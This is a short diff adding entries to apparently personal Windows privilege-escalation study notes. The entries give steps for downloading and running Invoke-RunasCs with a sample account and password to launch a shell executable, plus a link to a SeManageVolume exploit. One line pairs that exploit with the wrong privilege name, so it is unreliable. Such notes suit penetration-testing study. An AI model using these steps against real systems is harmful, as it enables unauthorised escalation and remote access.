@@ -218,6 +218,14 @@ Windows Privesc:
 
         Run Commands as differnt user ( when we already know password and we are running RDP):
             runas /user:backupadmin cmd
+        Or from cmd with:
+            Invoke-RunasCs.ps1
+            1. Download and Upload https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1
+            2. import module .\Invoke-RunasCs.ps1
+            3. Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "c:\Users\Public\shell3.exe"
+
+        If whoami /priv shows SeChangeNotifyPrivilege enabled we can run this exploit:
+            https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public
 
     Abusin Scheduled Tasks:
         Display Tasks:
